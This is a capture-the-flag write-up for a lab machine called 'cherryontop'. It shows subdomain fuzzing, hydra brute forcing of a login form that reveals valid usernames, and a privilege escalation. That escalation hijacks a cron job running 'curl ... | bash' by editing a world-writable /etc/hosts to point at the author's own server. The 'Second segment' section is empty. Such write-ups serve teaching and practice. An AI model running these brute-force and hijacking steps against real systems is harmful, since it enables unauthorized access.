

Network scan:
```
attack-box$ sudo nmap -sS -p- $target_ip -Pn -n --disable-arp-ping

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-07 12:33 UTC
Nmap scan report for 10.10.241.96
Host is up (0.039s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## First segment

Visiting the website on port 80, we find a video of Chad presenting his company. He hints
to look for subdomains so this would be the first step to do. Note that 13968 is the size of
the default response from `http://cherryontop.thm`

```
attack-box$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.241.96" -H "Host: FUZZ.cherryontop.thm" -fs 13968

...SNIP...
nano                    [Status: 200, Size: 10718, Words: 4093, Lines: 220, Duration: 657ms]
```

We can now add `nano.cherryontop.thm` to `/etc/hosts` and navigate to this subdomain using
the browser

![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/313c62c0-18fd-4e49-a190-bb563677cbcd)

Enumerating further the found subdomain, we find a login portal
```
attack-box$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://nano.cherryontop.thm/FUZZ" -e .php

...SNIP...
images                  [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 27ms]
index.php               [Status: 200, Size: 10718, Words: 4093, Lines: 220, Duration: 27ms]
login.php               [Status: 200, Size: 2310, Words: 696, Lines: 60, Duration: 27ms]
css                     [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 23ms]
js                      [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 24ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
                        [Status: 200, Size: 10718, Words: 4093, Lines: 220, Duration: 23ms]
.php                    [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 24ms]
bootstrap               [Status: 301, Size: 332, Words: 20, Lines: 10, Duration: 25ms]
jquery                  [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 25ms]
```

Trying some random usernames and passwords, we notice that the app says "This user doesn't
exist". This custom message makes it vulnerable to brute force using `hydra` as shown bellow.
Once a valid username is found, we can use the same technique to find a valid password.

```
attack-box$ hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p pass -m "/login.php:username=^USER^&password=^PASS^&submit=:F=This user doesn't exist" nano.cherryontop.thm http-post-form

...SNIP...
[80][http-post-form] host: nano.cherryontop.thm   login: puppet   password: pass
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-07 13:53:56

attack-box$ hydra -l puppet -P /usr/share/wordlists/rockyou.txt -m "/login.php:username=^USER^&password=^PASS^&submit=:F=Bad password" nano.cherryontop.thm http-post-form

...SNIP...
[80][http-post-form] host: nano.cherryontop.thm   login: puppet   password: master1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-07 14:00:20
```

![image](https://github.com/elomarii/CTF_4_DAY/assets/106914699/08b7a9a5-ec70-4269-8291-454264ab02db)

Got access to Molly's dashboard. All blackmailed people are listed on the webpage. Scrolling
down to Jex entry, we find that Molly has left her SSH password in plain sight, good gor us.
We can connect to her account on the target machine and get the first segment of Chad's password.

```
n4n0c*****
```
{: file='chads-key1.txt'}

Extra content
```
Dear Chad,

Cherries, Ice Cream, and Milk,
In the bowl of life, we mix and swirl,
Like cherries, ice cream, and milk's swirl.
Cherries so red, plucked from the tree,
Sweet as your love, pure as can be.
Ice cream so smooth, so cool and white,
Melts in my mouth, with sheer delight.
Milk so pure, so creamy and rich,
The base of our love, the perfect mix.
Together they blend, in perfect harmony,
Like you and I, so sweet, so free.
With each bite, my heart takes flight,
As our love grows, so strong, so bright.
Cherries, ice cream, and milk,
Our love's ingredients, so smooth and silk.
Forever and always, our love will stay,
Like the sweet taste, that never fades away.

Love,
Molly

P.S. I'll hold on tight to that first part of your password you gave me! If anything ever
happens to you, we'll all be sure to keep your dream of erasing vim off of all systems alive!
```
{: file='DONTLOOKCHAD.txt'}

## Second segment
...


## Third segment

Connect to the machine via ssh backdoor
```
attack-box$ ssh notsus@<target_ip>
```

We find a note left by Jex on notsus' home directory
```
Hey good work hacker. Glad you made it this far!

From here, we should be able to hit Bob-Boba where it hurts! Could you find a way to
escalate your privileges vertically to access his account?

Keep your's eyes peeled and don't be a script kiddie!

- Jex
```
{: file='youFoundIt.txt'}

After initial enumeration, we find an interesting entry in the crontab, which is a potential
priviledge escalation vector to Bob account
```
$ cat /etc/crontab

...SNIP...
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   bob-boba curl cherryontop.tld:8000/home/bob-boba/coinflip.sh | bash
```

If we try to get `coinflip.sh`, we'll get the following error
```
$ curl cherryontop.tld:8000/home/bob-boba/coinflip.sh

curl: (6) Could not resolve host: cherryontop.tld
```

Interestingly, we find that `/etc/hosts` is write accessible by all users:
```
$ ls -l /etc/hosts

-rw-rw-rw- 1 root adm 312 Apr  8  2023 /etc/hosts
```

To exploit this weakness on the machine, we can setup our own server which will provide our
own `coinflip.sh` script. We can then add our server's IP address as the address of
`cherryontop.tld`. The command we use below will give us access to Bob's home directory.

```bash
mkdir server && cd server

mkdir home && mkdir home/bob-boba

echo "#!/bin/bash\nchmod 777 /home/bob-boba" > home/bob-boba/coinflip.sh
```

Now we start the HTTP server using python on the port 8000 and wait for the target machine
to request the script
```
attack-box$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

10.10.241.96 - - [07/Jul/2024 13:01:02] "GET /home/bob-boba/coinflip.sh HTTP/1.1" 200 -
```
```
$ ls -l /home

total 16
drwxrwxrwx 4 bob-boba      bob-boba      4096 Jan  5  2024 bob-boba
drwxr-x--- 5 chad-cherry   chad-cherry   4096 Jan  5  2024 chad-cherry
drwxr-x--- 3 molly-milk    molly-milk    4096 Apr  8  2023 molly-milk
drwxr-x--- 3 sam-sprinkles sam-sprinkles 4096 Nov 26  2023 sam-sprinkles

$ cd bob-boba

$ ls

bobLog.txt  chads-key3.txt  coinflip.sh
```

Content of Bob's home folder, including the third segment of Chad password:
```
Bob Log

4/10/20XX

One of the funniest parts of working for Chad is both how much debt we have and how much other
people owe us!

I know that Chad uses me as both his accountant and debt collector, but really, we need to
hire more henchmen.

Perhaps we can convince the Arch Linux users to join our cause... Hopefully none of them like
Vim, after all, Chad intends to eliminate every trace of the text editor and replace it with
Nano.

Either way, I gotta really protect this password segment Chad gave me in case of emergencies!

Bob
```
{: file='bobLog.txt'}

```
7h3f*****
```
{: file='chads-key3.txt'}











